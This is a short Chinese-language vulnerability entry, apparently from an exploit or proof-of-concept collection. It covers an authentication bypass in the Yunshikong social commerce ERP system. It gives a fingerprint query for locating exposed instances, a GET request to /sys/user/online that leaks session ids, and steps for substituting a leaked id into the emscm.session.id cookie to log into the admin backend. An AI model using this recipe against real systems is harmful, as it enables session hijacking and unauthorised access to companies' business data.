# 云时空社会化商业ERP系统online存在身份认证绕过漏洞

云时空社会化商业ERP系统 ｜ 认证/授权绕过 ｜ —
- **指纹**：`app="云时空社会化商业ERP系统"`
- **请求**：`GET /sys/user/online HTTP/1.1`

**Payload**
```
响应包获取sessionid值
替换emscm.session.id，刷新页面即可登录后台
```
- **响应特征**：200